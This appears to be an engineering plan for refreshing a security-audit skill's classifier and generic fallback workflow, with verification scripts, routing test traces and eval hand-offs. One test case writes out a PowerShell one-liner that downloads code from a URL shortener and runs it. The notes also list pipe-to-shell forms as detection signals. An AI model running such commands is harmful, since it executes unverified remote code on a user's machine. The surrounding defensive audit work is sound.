- **Two subject checks first.** Every generic eval turns on what executes or what trust is granted, not on package metadata. The old 4 checks survive as canonical rows with explicit `N/A` / `Not available` paths, as the `criteria.md` L60 contract requires.
- **Verdict notes use the sibling `Toward …` headings.** `SKILL.md` Tree terms define a CRITICAL flag through the routed workflow's `Toward REJECTED` notes, so generic's CRITICALs become traceable without a generic addendum file.
- **Shape rule.** Quick by default keeps benign cases (bookmark, confirmed internal CA) short. HIGH/CRITICAL escalates to the full template, matching how sibling workflows raise the tier on red-flag triggers (e.g. cli-binary Tier 3 on curl-pipe-sh). Rejected: Quick always. A REJECTED root-CA or script audit would then lose the template's evidence sections.
- **Moderate cap.** Coverage completeness can't be High when the checklist itself was chosen without a confirmed type. Rejected: no cap. Rows would then all read Done/Skipped and claim High on an unconfirmed rubric.
- **Re-route window.** Closes the G-4 seam in practice: once Phase 3 evidence exists, re-routing would discard it silently.
- **Root-CA ratings.** An unknown or unsolicited CA = TLS interception → CRITICAL. A claimed-internal CA not yet confirmed = HIGH → CONDITIONAL with an out-of-band fingerprint check. A one-site exception = MEDIUM. Rejected: MEDIUM for all certificate cases, which would let an unsolicited root CA pass with a note.
- **Size.** 80 → 151 lines. `generic.md` is read only on low-confidence routes, so the read cost lands on a few audits.

**Verification:**
```bash
python3 -c "import re,pathlib;p=pathlib.Path('.projex/2610162004-generic-fallback-and-classifier-refresh-plan.md').read_text(encoding='utf-8');b=re.search(r'\`\`\`\`markdown\n(<!-- workflows/generic\.md.*?)\n\`\`\`\`\n',p,re.S).group(1)+'\n';print(b==pathlib.Path('workflows/generic.md').read_text(encoding='utf-8'))"   # True
wc -l < workflows/generic.md                                   # ≤ 160 (expect 151)
grep -c "^## Phase [1-4] — " workflows/generic.md              # 4
grep -c "^### Toward \(REJECTED\|CONDITIONAL\|APPROVED\)$" workflows/generic.md   # 3
grep -cF '**Classification confidence:** Low — generic fallback' workflows/generic.md   # 1
grep -cF 'Skipped (generic fallback)' workflows/generic.md     # 2 (rows table + confidence cap)
grep -c "No subject-specific verdict overrides" workflows/generic.md   # 0
```

**If this fails:** `git -C <work-root> checkout -- workflows/generic.md` and re-write from the block.

---

## Verification Plan

### Automated Checks

- [ ] `python3 evals/run_evals.py validate` → same first line as Preflight (41 evals; generic still 3, since `evals/` is untouched).
- [ ] `python3 -m unittest discover -s evals -p "test_*.py"` and `python3 -m unittest discover -s tests` → same result as Preflight.
- [ ] Consistency script (from `<work-root>`; not committed):
```bash
python3 - <<'EOF'
import pathlib, re
S = pathlib.Path("SKILL.md").read_text(encoding="utf-8")
C = pathlib.Path("references/classifier.md").read_text(encoding="utf-8")
G = pathlib.Path("workflows/generic.md").read_text(encoding="utf-8")
assert len(S.encode()) <= 15500, len(S.encode())
for bad, t in [("MCP manifest", S), ("claude-code/plugins", C), ("distributed via npm", C),
               ("MCP server manifest", C), ("No subject-specific verdict overrides", G)]:
    assert bad not in t, bad
for good, t in [("no local code or MCP server", S), ("irm … \\| iex", S), ("irm … \\| iex", C),
                ("agent-extension (8a)", C), ("agent-extension (8b)", C), ("cli-binary, **medium**", C),
                ("Sole exception", C), ("sole exception: `workflows/generic.md` Phase 2", S),
                ("**Execution & trust grant**", G), ("**Source provenance**", G),
                ("**Moderate** at most", G), ("Quick (generic fallback)", G), ("Standard (generic fallback)", G),
                ("If the user clarifies before Phase 3 starts", G),
                ("**Classification confidence:** Low — generic fallback", G)]:
    assert good in t, good
# every workflow path named in the three files exists
for t in (S, C, G):
    for p in set(re.findall(r"`(workflows/[a-z-]+\.md)`", t)):
        assert pathlib.Path(p).exists(), p
assert re.findall(r"^([1-8])\. \*\*", C, re.M) == list("12345678")
print("OK")
EOF
```
- [ ] `git -C <work-root> diff --stat <base>..HEAD` → exactly `SKILL.md`, `references/classifier.md`, `workflows/generic.md` (+ this plan's execution log).

### Manual Verification (paper traces)

Walk each case through `SKILL.md` Step 0 → `classifier.md` → routed workflow. Record the cited row/rule per hop in the execution log.

| # | Case | Expected |
|---|---|---|
| T1 | `claude mcp add --transport http notion https://mcp.notion.com/mcp`, OAuth sign-in | Row 8 strong ("server URL"), row 9 excluded ("no … MCP server") → **agent-extension 8a, high**; OAuth scopes via remote-integration sub-step (C3) |
| T2 | "Connect our Slack to SuperSummarize AI" (SaaS app, OAuth, no tools for user's agent) | Row 9 → **remote-integration, high** (C3 SaaS row) |
| T3 | `/plugin install foo@acme-mkt`, marketplace entry `source: npm` | Row 8 `/plugin install` → **agent-extension 8b, high** (C3 row 1, example 6) |
| T4 | eval 40: `npm install -g @anthropic/some-code-skill` | Row 1 → **registry-package** (C2, example 5) — eval 40 unchanged |
| T5 | eval 34: `iex ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/toolsetup'))` from a forum | Row 7 / C5 PowerShell signal; C4 opaque URL → **cli-binary, medium**; cli-binary Toward REJECTED "Install script … from unknown or unverifiable source" → **REJECTED** (assertions REJECTED, iex/RCE, shortener still satisfiable; routing assertion + `workflow` field → eval plan) |
| T6 | eval 33: portal + "accept a browser certificate" | C4 portal row → **generic, low**. Phase 2 non-interactive → Phase 3 trust grant: certificate from claimed internal IT, unconfirmed → HIGH (root CA) or MEDIUM (one-site) → **CONDITIONAL**; HIGH → full template; confidence ≤ Moderate; `## Audit Coverage` present; file written (eval 33 ✓) |
| T7 | eval 35: monorepo, `make install` | Conflict survives → **generic, low**. Phase 3: readable code executes, unreviewed → HIGH → **CONDITIONAL** (review Makefile); cli-binary install-script review as sub-step; Phase 2 question recorded (eval 35 "clarification" ✓) |
| T8 | Unknown root CA attached to an unsolicited "IT security" email, no other signal | **generic, low** → Toward REJECTED root CA from unsolicited issuer → CRITICAL → **REJECTED** |
| T9 | `irm https://astral.sh/uv/install.ps1 \| iex` | Row 7 → **cli-binary, high** (vendor domain; C4 doesn't apply) |

### Acceptance Criteria Validation

| Criterion | How to Verify | Expected Result |
|-----------|---------------|-----------------|
| generic rewrite exact + contents | Step 3 greps; consistency script | all counts match; `OK` |
| classifier edits | Step 1 greps; consistency script | 0 stale; 4 routes; 8 examples; `OK` |
| `SKILL.md` rows + budget | Step 2 greps; `wc -c` | 15,482 (≤ 15,500, ≤ S0) |
| Only 3 files; evals untouched | `git diff --stat` | 3 files |
| Harness green | validate + 2 unittest suites | = Preflight |
| Routing + verdict behaviour | T1–T9 in log | match table |

---

## Rollback Plan

1. Before close: `projex-abandon.sh <repo-root> claude/youthful-dijkstra-5ov1kt projex/2610162004-generic-fallback-and-classifier-refresh --worktree`. Base untouched.
2. After squash-close: `git -C <repo-root> revert <squash-sha>` (3 files only). If the eval plan already moved eval 34 to cli-binary, revert that eval edit too, or eval 34 routes generic again under the old classifier.

---

## Hand-off: routing requirements for sibling plans

| Plan | Requirement from this plan |
|---|---|
| agent-extension refresh | (1) Identify table: accept **remote 8a with no local code** (URL / custom connector / `claude mcp add --transport http`) and `.mcpb` / `.dxt`. (2) 8a procedure: when OAuth is used, run the remote-integration grant checks as a sub-step (this plan's override names `workflows/remote-integration.md`). Per 2610162007-remote-integration-rubric-refresh-plan.md Hand-off, cite its addendum §1 (scope classes), §5 (AI data use) and §6 (custody & consent path) by section reference, not by copying. (3) 8b Identify: `/plugin install` from a marketplace with any `source` type, incl. `npm`. (4) Replace `claude-code/plugins/*` / "manifest" wording to match `classifier.md` 8a/8b/8c. |
| remote-integration refresh (2610162007-remote-integration-rubric-refresh-plan.md) | Its AI-connector Identify row is route-agnostic and works with this decision. Requirements: (1) Scope note: tool-bearing AI-assistant connectors / remote MCP route to agent-extension 8a. This workflow serves them only as a borrowed OAuth/data sub-step, so keep that sub-step self-contained (scope review, token custody, vendor data use). (2) OAuth-only SaaS/AI apps ("AI over your Slack/Drive") stay here, and RI-7's AI sub-processor rows apply to them. |
| cli-binary refresh | Identify row "Install script (curl-pipe-bash)" and Distribution research should name the PowerShell forms (`irm … \| iex`, `iwr … \| iex`, `iex (… DownloadString …)`) and URL shorteners / paste sites as unverifiable sources (L236). Eval 34 now lands here. |
| eval plan | (1) **Eval 34:** `workflow` → `cli-binary`; assertion "Report routes to generic fallback or low-confidence path" → "Subject type is cli-binary"; expected_output → cli-binary medium + REJECTED; keep REJECTED / iex / shortener assertions. (2) **Generic drops to 2 cases** → add ≥ 1 generic case in the same change (`MIN_CASES_PER_WORKFLOW = 3`). Suggest T8 (unsolicited root CA → REJECTED; assert trust-store / TLS-interception concept) (E-1). (3) Eval 33: optionally assert "certificate issuer verification" concept. (4) New routing cases: T1 remote MCP → agent-extension 8a (coordinate with agent-extension P2's remote OAuth MCP case), T3 npm-sourced marketplace plugin → 8b, T9 vendor `irm \| iex` → cli-binary high. (5) Generic reports may now use the full template (`**Audit tier:** Standard (generic fallback)`); no current assertion checks generic tier. |
| STEWARDSHIP (orchestrator) | Note in the generic + classifier row that both were refreshed 2026-10-16. |

---

## Notes

### Decisions taken here (orchestrator may override before execution)

- **RI-8:** tool-bearing connector → agent-extension 8a (+ remote-integration sub-step). OAuth-only SaaS/AI app → remote-integration. Both source evals left this open ("needs joint decision"). The orchestrator assigned the classifier to this plan, so the decision is recorded here and pushed to siblings via the Hand-off. Reversal touches C3 (2 rows), C7, example 7, S2, S3.
- **Eval 34:** cli-binary, medium (G-3's suggested option). Reversal: drop the C4 pipe-to-shell row and example 8, and add "shortener → generic low" instead. The PowerShell signals stay either way.
- **Generic shape:** Quick by default, full template on any HIGH/CRITICAL. **Cap:** Moderate.

### Risks

- **Rating thresholds are policy** (root-CA tiers, provenance MEDIUM/HIGH). Mitigation: they all sit in Subject Verdict Notes, so retuning is a local edit.
- **Signal names drift** (Claude Code commands, skills CLIs, host list). Mitigation: A4. Signals only affect match strength; `STEWARDSHIP` cadence revisits.
- **Interim mismatch:** eval 34 `routing_match` false and remote-MCP subjects hitting an agent-extension workflow without OAuth guidance, until the sibling and eval plans land. Mitigation: all are queued this session, the paid live run happens after all of them, and the override text itself tells the auditor to borrow the remote-integration sub-step.
- **Concurrent `SKILL.md` edits by siblings.** Mitigation: per-row anchors, net −2 B, the Step 2 re-anchor rule.

### Facts not verified at planning (sources: sibling evals, not re-fetched)

- `source: npm` marketplace entries and Claude Code fetching them itself (agent-extension eval E9).
- Exact current names: `claude mcp add --transport http`, `/plugin marketplace add`, `claude plugin install`, `npx skills add`, `skills.sh`, `registry.modelcontextprotocol.io` (E8, E9, E17; Medium–High).
- Host list "Codex, VS Code agent mode" (agent-extension eval 5.9, Medium).
- MCP 2026-07-28 auth details (CIMD, RFC 9728/8707) are deliberately **not** encoded here. They belong in the agent-extension/remote-integration rubrics.

### Open Questions

None. The decisions above are recorded with their reversal paths.

### Split Decision

`No split — single scope, within size budget`. One `.projex/` scope, 3 steps. 613 lines / ~50 KB, mostly the verbatim `generic.md` block; the size heuristic also needs > 5 steps, so it is not tripped. The three files are one routing contract: the classifier rule, its `SKILL.md` summary, and the fallback that receives what the rule can't place. Spec-level text only; no upstream/downstream mix.

### Revision Log

| Date | Trigger | Change |
|---|---|---|
| 2026-10-16 | Initial (orchestrator dispatch, depth 1) | Planned against base `20843cc` (shared plan closed); all edits simulated |
